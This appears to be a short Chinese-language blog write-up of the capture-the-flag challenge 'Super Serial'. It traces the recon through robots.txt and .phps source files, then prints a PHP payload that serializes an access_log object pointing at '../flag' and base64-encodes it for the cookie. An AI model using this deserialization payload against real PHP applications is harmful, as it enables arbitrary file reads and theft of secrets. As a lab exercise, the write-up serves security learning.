+++
title = "pioCTF - Super Serial"
template = "page.html"
date = 2022-01-18T03:11:27+08:00
[taxonomies]
tags = ["ctf"]
[extra]
summary = "130 points"
+++

先檢查 robots.txt 發現有 `Disallow: /admin.phps`
接下來就檢查 `/index.phps` ，可以看到 Source Code，接下檢查發現他引用了兩隻 php
`authentication.php` `cookie.php`

一樣先檢查他們的 Source code，會發現有一隻從 Cookie 可以反序列化的函式

以下是 playload，將得到的 Token 塞進 Cookie 就拿到 Flag。

```php
<?php
class access_log {
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}
$perm = new access_log("../flag");
echo base64_encode(serialize($perm));
?>
```